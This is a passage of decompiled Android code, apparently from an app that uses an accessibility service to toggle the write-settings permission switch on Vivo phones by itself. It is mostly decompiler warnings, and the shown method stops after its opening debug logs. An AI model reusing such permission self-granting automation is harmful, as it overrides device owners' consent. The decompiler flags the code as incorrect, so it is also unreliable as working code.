    /* JADX WARN: Removed duplicated region for block: B:350:0x088b A[Catch: all -> 0x02c7, Exception -> 0x02ca, TryCatch #4 {Exception -> 0x02ca, blocks: (B:315:0x0727, B:306:0x06fd, B:312:0x070b, B:318:0x0740, B:407:0x0a3d, B:395:0x0a0c, B:397:0x0a14, B:400:0x0a1c, B:402:0x0a22, B:404:0x0a27, B:410:0x0a56, B:413:0x0a64, B:386:0x09e8, B:392:0x09f6, B:412:0x0a5e, B:372:0x0991, B:348:0x0883, B:350:0x088b, B:353:0x0893, B:355:0x0899, B:357:0x089e, B:360:0x08b9, B:363:0x08c7, B:365:0x0959, B:367:0x095f, B:369:0x0975, B:375:0x09aa, B:377:0x09b0, B:379:0x09b8, B:383:0x09d2, B:338:0x085c, B:345:0x086c, B:328:0x07d7, B:284:0x05fa, B:287:0x0603, B:291:0x060f, B:293:0x0625, B:296:0x0643, B:298:0x067f, B:301:0x069d, B:303:0x06de, B:321:0x075e, B:323:0x0771, B:325:0x07bb, B:331:0x07f0, B:333:0x07f6, B:335:0x083b, B:362:0x08c2, B:250:0x056b, B:256:0x0579, B:240:0x0512, B:218:0x045a, B:220:0x0460, B:223:0x0479, B:213:0x043e, B:215:0x0446, B:227:0x0493, B:229:0x0499, B:231:0x04b0, B:233:0x04c6, B:235:0x04cf, B:237:0x04f9, B:243:0x052b, B:245:0x0531, B:247:0x054d, B:201:0x03dd, B:203:0x03e3, B:206:0x03fc, B:196:0x03c1, B:198:0x03c9, B:210:0x0416, B:138:0x02a6, B:140:0x02ae, B:148:0x02ce), top: B:425:0x0034 }] */
    /* JADX WARN: Removed duplicated region for block: B:351:0x0890  */
    /* JADX WARN: Removed duplicated region for block: B:353:0x0893 A[Catch: all -> 0x02c7, Exception -> 0x02ca, TryCatch #4 {Exception -> 0x02ca, blocks: (B:315:0x0727, B:306:0x06fd, B:312:0x070b, B:318:0x0740, B:407:0x0a3d, B:395:0x0a0c, B:397:0x0a14, B:400:0x0a1c, B:402:0x0a22, B:404:0x0a27, B:410:0x0a56, B:413:0x0a64, B:386:0x09e8, B:392:0x09f6, B:412:0x0a5e, B:372:0x0991, B:348:0x0883, B:350:0x088b, B:353:0x0893, B:355:0x0899, B:357:0x089e, B:360:0x08b9, B:363:0x08c7, B:365:0x0959, B:367:0x095f, B:369:0x0975, B:375:0x09aa, B:377:0x09b0, B:379:0x09b8, B:383:0x09d2, B:338:0x085c, B:345:0x086c, B:328:0x07d7, B:284:0x05fa, B:287:0x0603, B:291:0x060f, B:293:0x0625, B:296:0x0643, B:298:0x067f, B:301:0x069d, B:303:0x06de, B:321:0x075e, B:323:0x0771, B:325:0x07bb, B:331:0x07f0, B:333:0x07f6, B:335:0x083b, B:362:0x08c2, B:250:0x056b, B:256:0x0579, B:240:0x0512, B:218:0x045a, B:220:0x0460, B:223:0x0479, B:213:0x043e, B:215:0x0446, B:227:0x0493, B:229:0x0499, B:231:0x04b0, B:233:0x04c6, B:235:0x04cf, B:237:0x04f9, B:243:0x052b, B:245:0x0531, B:247:0x054d, B:201:0x03dd, B:203:0x03e3, B:206:0x03fc, B:196:0x03c1, B:198:0x03c9, B:210:0x0416, B:138:0x02a6, B:140:0x02ae, B:148:0x02ce), top: B:425:0x0034 }] */
    /* JADX WARN: Removed duplicated region for block: B:354:0x0898  */
    /* JADX WARN: Removed duplicated region for block: B:357:0x089e A[Catch: all -> 0x02c7, Exception -> 0x02ca, TRY_LEAVE, TryCatch #4 {Exception -> 0x02ca, blocks: (B:315:0x0727, B:306:0x06fd, B:312:0x070b, B:318:0x0740, B:407:0x0a3d, B:395:0x0a0c, B:397:0x0a14, B:400:0x0a1c, B:402:0x0a22, B:404:0x0a27, B:410:0x0a56, B:413:0x0a64, B:386:0x09e8, B:392:0x09f6, B:412:0x0a5e, B:372:0x0991, B:348:0x0883, B:350:0x088b, B:353:0x0893, B:355:0x0899, B:357:0x089e, B:360:0x08b9, B:363:0x08c7, B:365:0x0959, B:367:0x095f, B:369:0x0975, B:375:0x09aa, B:377:0x09b0, B:379:0x09b8, B:383:0x09d2, B:338:0x085c, B:345:0x086c, B:328:0x07d7, B:284:0x05fa, B:287:0x0603, B:291:0x060f, B:293:0x0625, B:296:0x0643, B:298:0x067f, B:301:0x069d, B:303:0x06de, B:321:0x075e, B:323:0x0771, B:325:0x07bb, B:331:0x07f0, B:333:0x07f6, B:335:0x083b, B:362:0x08c2, B:250:0x056b, B:256:0x0579, B:240:0x0512, B:218:0x045a, B:220:0x0460, B:223:0x0479, B:213:0x043e, B:215:0x0446, B:227:0x0493, B:229:0x0499, B:231:0x04b0, B:233:0x04c6, B:235:0x04cf, B:237:0x04f9, B:243:0x052b, B:245:0x0531, B:247:0x054d, B:201:0x03dd, B:203:0x03e3, B:206:0x03fc, B:196:0x03c1, B:198:0x03c9, B:210:0x0416, B:138:0x02a6, B:140:0x02ae, B:148:0x02ce), top: B:425:0x0034 }] */
    /* JADX WARN: Removed duplicated region for block: B:360:0x08b9 A[Catch: all -> 0x02c7, Exception -> 0x02ca, TRY_ENTER, TryCatch #4 {Exception -> 0x02ca, blocks: (B:315:0x0727, B:306:0x06fd, B:312:0x070b, B:318:0x0740, B:407:0x0a3d, B:395:0x0a0c, B:397:0x0a14, B:400:0x0a1c, B:402:0x0a22, B:404:0x0a27, B:410:0x0a56, B:413:0x0a64, B:386:0x09e8, B:392:0x09f6, B:412:0x0a5e, B:372:0x0991, B:348:0x0883, B:350:0x088b, B:353:0x0893, B:355:0x0899, B:357:0x089e, B:360:0x08b9, B:363:0x08c7, B:365:0x0959, B:367:0x095f, B:369:0x0975, B:375:0x09aa, B:377:0x09b0, B:379:0x09b8, B:383:0x09d2, B:338:0x085c, B:345:0x086c, B:328:0x07d7, B:284:0x05fa, B:287:0x0603, B:291:0x060f, B:293:0x0625, B:296:0x0643, B:298:0x067f, B:301:0x069d, B:303:0x06de, B:321:0x075e, B:323:0x0771, B:325:0x07bb, B:331:0x07f0, B:333:0x07f6, B:335:0x083b, B:362:0x08c2, B:250:0x056b, B:256:0x0579, B:240:0x0512, B:218:0x045a, B:220:0x0460, B:223:0x0479, B:213:0x043e, B:215:0x0446, B:227:0x0493, B:229:0x0499, B:231:0x04b0, B:233:0x04c6, B:235:0x04cf, B:237:0x04f9, B:243:0x052b, B:245:0x0531, B:247:0x054d, B:201:0x03dd, B:203:0x03e3, B:206:0x03fc, B:196:0x03c1, B:198:0x03c9, B:210:0x0416, B:138:0x02a6, B:140:0x02ae, B:148:0x02ce), top: B:425:0x0034 }] */
    /* JADX WARN: Removed duplicated region for block: B:362:0x08c2 A[Catch: all -> 0x02c7, Exception -> 0x02ca, TryCatch #4 {Exception -> 0x02ca, blocks: (B:315:0x0727, B:306:0x06fd, B:312:0x070b, B:318:0x0740, B:407:0x0a3d, B:395:0x0a0c, B:397:0x0a14, B:400:0x0a1c, B:402:0x0a22, B:404:0x0a27, B:410:0x0a56, B:413:0x0a64, B:386:0x09e8, B:392:0x09f6, B:412:0x0a5e, B:372:0x0991, B:348:0x0883, B:350:0x088b, B:353:0x0893, B:355:0x0899, B:357:0x089e, B:360:0x08b9, B:363:0x08c7, B:365:0x0959, B:367:0x095f, B:369:0x0975, B:375:0x09aa, B:377:0x09b0, B:379:0x09b8, B:383:0x09d2, B:338:0x085c, B:345:0x086c, B:328:0x07d7, B:284:0x05fa, B:287:0x0603, B:291:0x060f, B:293:0x0625, B:296:0x0643, B:298:0x067f, B:301:0x069d, B:303:0x06de, B:321:0x075e, B:323:0x0771, B:325:0x07bb, B:331:0x07f0, B:333:0x07f6, B:335:0x083b, B:362:0x08c2, B:250:0x056b, B:256:0x0579, B:240:0x0512, B:218:0x045a, B:220:0x0460, B:223:0x0479, B:213:0x043e, B:215:0x0446, B:227:0x0493, B:229:0x0499, B:231:0x04b0, B:233:0x04c6, B:235:0x04cf, B:237:0x04f9, B:243:0x052b, B:245:0x0531, B:247:0x054d, B:201:0x03dd, B:203:0x03e3, B:206:0x03fc, B:196:0x03c1, B:198:0x03c9, B:210:0x0416, B:138:0x02a6, B:140:0x02ae, B:148:0x02ce), top: B:425:0x0034 }] */
    /* JADX WARN: Removed duplicated region for block: B:365:0x0959 A[Catch: all -> 0x02c7, Exception -> 0x02ca, TryCatch #4 {Exception -> 0x02ca, blocks: (B:315:0x0727, B:306:0x06fd, B:312:0x070b, B:318:0x0740, B:407:0x0a3d, B:395:0x0a0c, B:397:0x0a14, B:400:0x0a1c, B:402:0x0a22, B:404:0x0a27, B:410:0x0a56, B:413:0x0a64, B:386:0x09e8, B:392:0x09f6, B:412:0x0a5e, B:372:0x0991, B:348:0x0883, B:350:0x088b, B:353:0x0893, B:355:0x0899, B:357:0x089e, B:360:0x08b9, B:363:0x08c7, B:365:0x0959, B:367:0x095f, B:369:0x0975, B:375:0x09aa, B:377:0x09b0, B:379:0x09b8, B:383:0x09d2, B:338:0x085c, B:345:0x086c, B:328:0x07d7, B:284:0x05fa, B:287:0x0603, B:291:0x060f, B:293:0x0625, B:296:0x0643, B:298:0x067f, B:301:0x069d, B:303:0x06de, B:321:0x075e, B:323:0x0771, B:325:0x07bb, B:331:0x07f0, B:333:0x07f6, B:335:0x083b, B:362:0x08c2, B:250:0x056b, B:256:0x0579, B:240:0x0512, B:218:0x045a, B:220:0x0460, B:223:0x0479, B:213:0x043e, B:215:0x0446, B:227:0x0493, B:229:0x0499, B:231:0x04b0, B:233:0x04c6, B:235:0x04cf, B:237:0x04f9, B:243:0x052b, B:245:0x0531, B:247:0x054d, B:201:0x03dd, B:203:0x03e3, B:206:0x03fc, B:196:0x03c1, B:198:0x03c9, B:210:0x0416, B:138:0x02a6, B:140:0x02ae, B:148:0x02ce), top: B:425:0x0034 }] */
    /* JADX WARN: Removed duplicated region for block: B:366:0x095e  */
    /* JADX WARN: Removed duplicated region for block: B:369:0x0975 A[Catch: all -> 0x02c7, Exception -> 0x02ca, TryCatch #4 {Exception -> 0x02ca, blocks: (B:315:0x0727, B:306:0x06fd, B:312:0x070b, B:318:0x0740, B:407:0x0a3d, B:395:0x0a0c, B:397:0x0a14, B:400:0x0a1c, B:402:0x0a22, B:404:0x0a27, B:410:0x0a56, B:413:0x0a64, B:386:0x09e8, B:392:0x09f6, B:412:0x0a5e, B:372:0x0991, B:348:0x0883, B:350:0x088b, B:353:0x0893, B:355:0x0899, B:357:0x089e, B:360:0x08b9, B:363:0x08c7, B:365:0x0959, B:367:0x095f, B:369:0x0975, B:375:0x09aa, B:377:0x09b0, B:379:0x09b8, B:383:0x09d2, B:338:0x085c, B:345:0x086c, B:328:0x07d7, B:284:0x05fa, B:287:0x0603, B:291:0x060f, B:293:0x0625, B:296:0x0643, B:298:0x067f, B:301:0x069d, B:303:0x06de, B:321:0x075e, B:323:0x0771, B:325:0x07bb, B:331:0x07f0, B:333:0x07f6, B:335:0x083b, B:362:0x08c2, B:250:0x056b, B:256:0x0579, B:240:0x0512, B:218:0x045a, B:220:0x0460, B:223:0x0479, B:213:0x043e, B:215:0x0446, B:227:0x0493, B:229:0x0499, B:231:0x04b0, B:233:0x04c6, B:235:0x04cf, B:237:0x04f9, B:243:0x052b, B:245:0x0531, B:247:0x054d, B:201:0x03dd, B:203:0x03e3, B:206:0x03fc, B:196:0x03c1, B:198:0x03c9, B:210:0x0416, B:138:0x02a6, B:140:0x02ae, B:148:0x02ce), top: B:425:0x0034 }] */
    /* JADX WARN: Removed duplicated region for block: B:375:0x09aa A[Catch: all -> 0x02c7, Exception -> 0x02ca, TRY_ENTER, TryCatch #4 {Exception -> 0x02ca, blocks: (B:315:0x0727, B:306:0x06fd, B:312:0x070b, B:318:0x0740, B:407:0x0a3d, B:395:0x0a0c, B:397:0x0a14, B:400:0x0a1c, B:402:0x0a22, B:404:0x0a27, B:410:0x0a56, B:413:0x0a64, B:386:0x09e8, B:392:0x09f6, B:412:0x0a5e, B:372:0x0991, B:348:0x0883, B:350:0x088b, B:353:0x0893, B:355:0x0899, B:357:0x089e, B:360:0x08b9, B:363:0x08c7, B:365:0x0959, B:367:0x095f, B:369:0x0975, B:375:0x09aa, B:377:0x09b0, B:379:0x09b8, B:383:0x09d2, B:338:0x085c, B:345:0x086c, B:328:0x07d7, B:284:0x05fa, B:287:0x0603, B:291:0x060f, B:293:0x0625, B:296:0x0643, B:298:0x067f, B:301:0x069d, B:303:0x06de, B:321:0x075e, B:323:0x0771, B:325:0x07bb, B:331:0x07f0, B:333:0x07f6, B:335:0x083b, B:362:0x08c2, B:250:0x056b, B:256:0x0579, B:240:0x0512, B:218:0x045a, B:220:0x0460, B:223:0x0479, B:213:0x043e, B:215:0x0446, B:227:0x0493, B:229:0x0499, B:231:0x04b0, B:233:0x04c6, B:235:0x04cf, B:237:0x04f9, B:243:0x052b, B:245:0x0531, B:247:0x054d, B:201:0x03dd, B:203:0x03e3, B:206:0x03fc, B:196:0x03c1, B:198:0x03c9, B:210:0x0416, B:138:0x02a6, B:140:0x02ae, B:148:0x02ce), top: B:425:0x0034 }] */
    /* JADX WARN: Removed duplicated region for block: B:388:0x09f0  */
    /* JADX WARN: Removed duplicated region for block: B:392:0x09f6 A[Catch: all -> 0x02c7, Exception -> 0x02ca, TryCatch #4 {Exception -> 0x02ca, blocks: (B:315:0x0727, B:306:0x06fd, B:312:0x070b, B:318:0x0740, B:407:0x0a3d, B:395:0x0a0c, B:397:0x0a14, B:400:0x0a1c, B:402:0x0a22, B:404:0x0a27, B:410:0x0a56, B:413:0x0a64, B:386:0x09e8, B:392:0x09f6, B:412:0x0a5e, B:372:0x0991, B:348:0x0883, B:350:0x088b, B:353:0x0893, B:355:0x0899, B:357:0x089e, B:360:0x08b9, B:363:0x08c7, B:365:0x0959, B:367:0x095f, B:369:0x0975, B:375:0x09aa, B:377:0x09b0, B:379:0x09b8, B:383:0x09d2, B:338:0x085c, B:345:0x086c, B:328:0x07d7, B:284:0x05fa, B:287:0x0603, B:291:0x060f, B:293:0x0625, B:296:0x0643, B:298:0x067f, B:301:0x069d, B:303:0x06de, B:321:0x075e, B:323:0x0771, B:325:0x07bb, B:331:0x07f0, B:333:0x07f6, B:335:0x083b, B:362:0x08c2, B:250:0x056b, B:256:0x0579, B:240:0x0512, B:218:0x045a, B:220:0x0460, B:223:0x0479, B:213:0x043e, B:215:0x0446, B:227:0x0493, B:229:0x0499, B:231:0x04b0, B:233:0x04c6, B:235:0x04cf, B:237:0x04f9, B:243:0x052b, B:245:0x0531, B:247:0x054d, B:201:0x03dd, B:203:0x03e3, B:206:0x03fc, B:196:0x03c1, B:198:0x03c9, B:210:0x0416, B:138:0x02a6, B:140:0x02ae, B:148:0x02ce), top: B:425:0x0034 }] */
    /* JADX WARN: Removed duplicated region for block: B:397:0x0a14 A[Catch: all -> 0x02c7, Exception -> 0x02ca, TryCatch #4 {Exception -> 0x02ca, blocks: (B:315:0x0727, B:306:0x06fd, B:312:0x070b, B:318:0x0740, B:407:0x0a3d, B:395:0x0a0c, B:397:0x0a14, B:400:0x0a1c, B:402:0x0a22, B:404:0x0a27, B:410:0x0a56, B:413:0x0a64, B:386:0x09e8, B:392:0x09f6, B:412:0x0a5e, B:372:0x0991, B:348:0x0883, B:350:0x088b, B:353:0x0893, B:355:0x0899, B:357:0x089e, B:360:0x08b9, B:363:0x08c7, B:365:0x0959, B:367:0x095f, B:369:0x0975, B:375:0x09aa, B:377:0x09b0, B:379:0x09b8, B:383:0x09d2, B:338:0x085c, B:345:0x086c, B:328:0x07d7, B:284:0x05fa, B:287:0x0603, B:291:0x060f, B:293:0x0625, B:296:0x0643, B:298:0x067f, B:301:0x069d, B:303:0x06de, B:321:0x075e, B:323:0x0771, B:325:0x07bb, B:331:0x07f0, B:333:0x07f6, B:335:0x083b, B:362:0x08c2, B:250:0x056b, B:256:0x0579, B:240:0x0512, B:218:0x045a, B:220:0x0460, B:223:0x0479, B:213:0x043e, B:215:0x0446, B:227:0x0493, B:229:0x0499, B:231:0x04b0, B:233:0x04c6, B:235:0x04cf, B:237:0x04f9, B:243:0x052b, B:245:0x0531, B:247:0x054d, B:201:0x03dd, B:203:0x03e3, B:206:0x03fc, B:196:0x03c1, B:198:0x03c9, B:210:0x0416, B:138:0x02a6, B:140:0x02ae, B:148:0x02ce), top: B:425:0x0034 }] */
    /* JADX WARN: Removed duplicated region for block: B:398:0x0a19  */
    /* JADX WARN: Removed duplicated region for block: B:400:0x0a1c A[Catch: all -> 0x02c7, Exception -> 0x02ca, TryCatch #4 {Exception -> 0x02ca, blocks: (B:315:0x0727, B:306:0x06fd, B:312:0x070b, B:318:0x0740, B:407:0x0a3d, B:395:0x0a0c, B:397:0x0a14, B:400:0x0a1c, B:402:0x0a22, B:404:0x0a27, B:410:0x0a56, B:413:0x0a64, B:386:0x09e8, B:392:0x09f6, B:412:0x0a5e, B:372:0x0991, B:348:0x0883, B:350:0x088b, B:353:0x0893, B:355:0x0899, B:357:0x089e, B:360:0x08b9, B:363:0x08c7, B:365:0x0959, B:367:0x095f, B:369:0x0975, B:375:0x09aa, B:377:0x09b0, B:379:0x09b8, B:383:0x09d2, B:338:0x085c, B:345:0x086c, B:328:0x07d7, B:284:0x05fa, B:287:0x0603, B:291:0x060f, B:293:0x0625, B:296:0x0643, B:298:0x067f, B:301:0x069d, B:303:0x06de, B:321:0x075e, B:323:0x0771, B:325:0x07bb, B:331:0x07f0, B:333:0x07f6, B:335:0x083b, B:362:0x08c2, B:250:0x056b, B:256:0x0579, B:240:0x0512, B:218:0x045a, B:220:0x0460, B:223:0x0479, B:213:0x043e, B:215:0x0446, B:227:0x0493, B:229:0x0499, B:231:0x04b0, B:233:0x04c6, B:235:0x04cf, B:237:0x04f9, B:243:0x052b, B:245:0x0531, B:247:0x054d, B:201:0x03dd, B:203:0x03e3, B:206:0x03fc, B:196:0x03c1, B:198:0x03c9, B:210:0x0416, B:138:0x02a6, B:140:0x02ae, B:148:0x02ce), top: B:425:0x0034 }] */
    /* JADX WARN: Removed duplicated region for block: B:401:0x0a21  */
    /* JADX WARN: Removed duplicated region for block: B:404:0x0a27 A[Catch: all -> 0x02c7, Exception -> 0x02ca, TryCatch #4 {Exception -> 0x02ca, blocks: (B:315:0x0727, B:306:0x06fd, B:312:0x070b, B:318:0x0740, B:407:0x0a3d, B:395:0x0a0c, B:397:0x0a14, B:400:0x0a1c, B:402:0x0a22, B:404:0x0a27, B:410:0x0a56, B:413:0x0a64, B:386:0x09e8, B:392:0x09f6, B:412:0x0a5e, B:372:0x0991, B:348:0x0883, B:350:0x088b, B:353:0x0893, B:355:0x0899, B:357:0x089e, B:360:0x08b9, B:363:0x08c7, B:365:0x0959, B:367:0x095f, B:369:0x0975, B:375:0x09aa, B:377:0x09b0, B:379:0x09b8, B:383:0x09d2, B:338:0x085c, B:345:0x086c, B:328:0x07d7, B:284:0x05fa, B:287:0x0603, B:291:0x060f, B:293:0x0625, B:296:0x0643, B:298:0x067f, B:301:0x069d, B:303:0x06de, B:321:0x075e, B:323:0x0771, B:325:0x07bb, B:331:0x07f0, B:333:0x07f6, B:335:0x083b, B:362:0x08c2, B:250:0x056b, B:256:0x0579, B:240:0x0512, B:218:0x045a, B:220:0x0460, B:223:0x0479, B:213:0x043e, B:215:0x0446, B:227:0x0493, B:229:0x0499, B:231:0x04b0, B:233:0x04c6, B:235:0x04cf, B:237:0x04f9, B:243:0x052b, B:245:0x0531, B:247:0x054d, B:201:0x03dd, B:203:0x03e3, B:206:0x03fc, B:196:0x03c1, B:198:0x03c9, B:210:0x0416, B:138:0x02a6, B:140:0x02ae, B:148:0x02ce), top: B:425:0x0034 }] */
    /* JADX WARN: Removed duplicated region for block: B:410:0x0a56 A[Catch: all -> 0x02c7, Exception -> 0x02ca, TRY_ENTER, TryCatch #4 {Exception -> 0x02ca, blocks: (B:315:0x0727, B:306:0x06fd, B:312:0x070b, B:318:0x0740, B:407:0x0a3d, B:395:0x0a0c, B:397:0x0a14, B:400:0x0a1c, B:402:0x0a22, B:404:0x0a27, B:410:0x0a56, B:413:0x0a64, B:386:0x09e8, B:392:0x09f6, B:412:0x0a5e, B:372:0x0991, B:348:0x0883, B:350:0x088b, B:353:0x0893, B:355:0x0899, B:357:0x089e, B:360:0x08b9, B:363:0x08c7, B:365:0x0959, B:367:0x095f, B:369:0x0975, B:375:0x09aa, B:377:0x09b0, B:379:0x09b8, B:383:0x09d2, B:338:0x085c, B:345:0x086c, B:328:0x07d7, B:284:0x05fa, B:287:0x0603, B:291:0x060f, B:293:0x0625, B:296:0x0643, B:298:0x067f, B:301:0x069d, B:303:0x06de, B:321:0x075e, B:323:0x0771, B:325:0x07bb, B:331:0x07f0, B:333:0x07f6, B:335:0x083b, B:362:0x08c2, B:250:0x056b, B:256:0x0579, B:240:0x0512, B:218:0x045a, B:220:0x0460, B:223:0x0479, B:213:0x043e, B:215:0x0446, B:227:0x0493, B:229:0x0499, B:231:0x04b0, B:233:0x04c6, B:235:0x04cf, B:237:0x04f9, B:243:0x052b, B:245:0x0531, B:247:0x054d, B:201:0x03dd, B:203:0x03e3, B:206:0x03fc, B:196:0x03c1, B:198:0x03c9, B:210:0x0416, B:138:0x02a6, B:140:0x02ae, B:148:0x02ce), top: B:425:0x0034 }] */
    /* JADX WARN: Removed duplicated region for block: B:412:0x0a5e A[Catch: all -> 0x02c7, Exception -> 0x02ca, TryCatch #4 {Exception -> 0x02ca, blocks: (B:315:0x0727, B:306:0x06fd, B:312:0x070b, B:318:0x0740, B:407:0x0a3d, B:395:0x0a0c, B:397:0x0a14, B:400:0x0a1c, B:402:0x0a22, B:404:0x0a27, B:410:0x0a56, B:413:0x0a64, B:386:0x09e8, B:392:0x09f6, B:412:0x0a5e, B:372:0x0991, B:348:0x0883, B:350:0x088b, B:353:0x0893, B:355:0x0899, B:357:0x089e, B:360:0x08b9, B:363:0x08c7, B:365:0x0959, B:367:0x095f, B:369:0x0975, B:375:0x09aa, B:377:0x09b0, B:379:0x09b8, B:383:0x09d2, B:338:0x085c, B:345:0x086c, B:328:0x07d7, B:284:0x05fa, B:287:0x0603, B:291:0x060f, B:293:0x0625, B:296:0x0643, B:298:0x067f, B:301:0x069d, B:303:0x06de, B:321:0x075e, B:323:0x0771, B:325:0x07bb, B:331:0x07f0, B:333:0x07f6, B:335:0x083b, B:362:0x08c2, B:250:0x056b, B:256:0x0579, B:240:0x0512, B:218:0x045a, B:220:0x0460, B:223:0x0479, B:213:0x043e, B:215:0x0446, B:227:0x0493, B:229:0x0499, B:231:0x04b0, B:233:0x04c6, B:235:0x04cf, B:237:0x04f9, B:243:0x052b, B:245:0x0531, B:247:0x054d, B:201:0x03dd, B:203:0x03e3, B:206:0x03fc, B:196:0x03c1, B:198:0x03c9, B:210:0x0416, B:138:0x02a6, B:140:0x02ae, B:148:0x02ce), top: B:425:0x0034 }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0019  */
    /* JADX WARN: Type inference failed for: r3v10 */
    /* JADX WARN: Type inference failed for: r3v11 */
    /* JADX WARN: Type inference failed for: r3v118 */
    /* JADX WARN: Type inference failed for: r3v119 */
    /* JADX WARN: Type inference failed for: r3v12 */
    /* JADX WARN: Type inference failed for: r3v153 */
    /* JADX WARN: Type inference failed for: r3v154 */
    /* JADX WARN: Type inference failed for: r3v17 */
    /* JADX WARN: Type inference failed for: r3v18 */
    /* JADX WARN: Type inference failed for: r3v19 */
    /* JADX WARN: Type inference failed for: r3v2, types: [com.storm.safe.rock.service.modules.WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$1] */
    /* JADX WARN: Type inference failed for: r3v20 */
    /* JADX WARN: Type inference failed for: r3v3 */
    /* JADX WARN: Type inference failed for: r3v4 */
    /* JADX WARN: Type inference failed for: r3v5 */
    /* JADX WARN: Type inference failed for: r3v6 */
    /* JADX WARN: Type inference failed for: r3v7 */
    /* JADX WARN: Type inference failed for: r3v70 */
    /* JADX WARN: Type inference failed for: r3v71 */
    /* JADX WARN: Type inference failed for: r3v76 */
    /* JADX WARN: Type inference failed for: r3v77 */
    /* JADX WARN: Type inference failed for: r3v8 */
    /* JADX WARN: Type inference failed for: r3v9 */
    /* JADX WARN: Type inference failed for: r5v0, types: [int] */
    /* JADX WARN: Type inference failed for: r5v1 */
    /* JADX WARN: Type inference failed for: r5v118 */
    /* JADX WARN: Type inference failed for: r5v16, types: [android.view.accessibility.AccessibilityNodeInfo] */
    /* JADX WARN: Type inference failed for: r5v19 */
    /* JADX WARN: Type inference failed for: r5v2 */
    /* JADX WARN: Type inference failed for: r5v38 */
    /* JADX WARN: Type inference failed for: r5v39 */
    /* JADX WARN: Type inference failed for: r5v5 */
    /* JADX WARN: Type inference failed for: r5v6 */
    /* JADX WARN: Type inference failed for: r5v9, types: [android.view.accessibility.AccessibilityNodeInfo] */
    /* renamed from: a7 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211718a7(ContinuationImpl continuationImpl) throws Throwable {
        C0327b2 writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1;
        Object obj;
        Object obj2;
        Object obj3;
        Object obj4;
        String str;
        WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$1 writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12;
        AccessibilityNodeInfo accessibilityNodeInfo;
        int i;
        C0327b2 c0327b2;
        Object objM211717a6;
        C0327b2 c0327b22;
        AccessibilityNodeInfo accessibilityNodeInfo2;
        AccessibilityNodeInfo accessibilityNodeInfo3;
        AccessibilityNodeInfo accessibilityNodeInfo4;
        C0327b2 c0327b23;
        C0327b2 c0327b24;
        Object objM211747f2;
        C0327b2 c0327b25;
        AccessibilityNodeInfo accessibilityNodeInfo5;
        Object objM211747f22;
        AccessibilityNodeInfo accessibilityNodeInfo6;
        AccessibilityNodeInfo accessibilityNodeInfo7;
        C0327b2 c0327b26;
        AccessibilityNodeInfo accessibilityNodeInfo8;
        AccessibilityNodeInfo parent;
        String str2;
        String str3;
        Object objM211747f23;
        AccessibilityNodeInfo accessibilityNodeInfo9;
        C0327b2 c0327b27;
        AccessibilityNodeInfo accessibilityNodeInfo10;
        C0327b2 c0327b28;
        AccessibilityNodeInfo accessibilityNodeInfo11;
        C0327b2 c0327b29;
        boolean z;
        AccessibilityNodeInfo accessibilityNodeInfo12;
        AccessibilityNodeInfo accessibilityNodeInfo13;
        AccessibilityNodeInfo accessibilityNodeInfo14;
        C0327b2 c0327b210;
        AccessibilityNodeInfo accessibilityNodeInfoM211700c2;
        Object objM211747f24;
        AccessibilityNodeInfo rootInActiveWindow;
        AccessibilityNodeInfo accessibilityNodeInfoM211704d1;
        boolean zIsChecked;
        C0327b2 c0327b211;
        AccessibilityNodeInfo accessibilityNodeInfo15;
        C0327b2 c0327b212;
        boolean z2;
        AccessibilityNodeInfo accessibilityNodeInfo16;
        C0327b2 c0327b213;
        AccessibilityNodeInfo accessibilityNodeInfo17;
        C0327b2 c0327b214;
        boolean zIsChecked2;
        boolean zIsChecked3;
        AccessibilityNodeInfo accessibilityNodeInfo18;
        C0327b2 c0327b215;
        AccessibilityNodeInfo accessibilityNodeInfo19;
        C0327b2 c0327b216;
        boolean z3;
        AccessibilityNodeInfo accessibilityNodeInfo20;
        C0327b2 c0327b217;
        AccessibilityNodeInfo accessibilityNodeInfo21;
        C0327b2 c0327b218;
        AccessibilityNodeInfo accessibilityNodeInfo22;
        C0327b2 c0327b219;
        AccessibilityNodeInfo accessibilityNodeInfo23;
        C0327b2 c0327b220;
        boolean zIsChecked4;
        AccessibilityNodeInfo accessibilityNodeInfo24;
        C0327b2 c0327b221;
        AccessibilityNodeInfo accessibilityNodeInfo25;
        C0327b2 c0327b222;
        boolean z4;
        AccessibilityNodeInfo accessibilityNodeInfo26;
        C0327b2 c0327b223;
        AccessibilityNodeInfo accessibilityNodeInfo27;
        C0327b2 c0327b224;
        if (continuationImpl instanceof WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$1) {
            WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$1 writeSettingsPermissionManager$attemptVivoRightSwitchToggle$13 = (WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$1) continuationImpl;
            int i2 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$13.f52945a7;
            if ((i2 & Integer.MIN_VALUE) != 0) {
                writeSettingsPermissionManager$attemptVivoRightSwitchToggle$13.f52945a7 = i2 - Integer.MIN_VALUE;
                writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$13;
            } else {
                writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1 = new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$1(this, continuationImpl);
            }
        }
        Object objM211715a4 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52943a5;
        kj1.m213566b3();
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        AccessibilityNodeInfo rootInActiveWindow2 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f52945a7;
        try {
            try {
                try {
                    try {
                        try {
                            try {
                                try {
                                    switch (rootInActiveWindow2) {
                                        case 0:
                                            int i3 = 0;
                                            kg1.m213544f4(objM211715a4);
                                            rootInActiveWindow2 = this.f53166a0.getRootInActiveWindow();
                                            if (rootInActiveWindow2 == 0) {
                                                return t60.m214689a7(false);
                                            }
                                            try {
                                                t60.m214704c5("WriteSettingsPerm", "╔════════════════════════════════════════════════════════════");
                                                t60.m214704c5("WriteSettingsPerm", "║ [调试] attemptVivoRightSwitchToggle 开始");
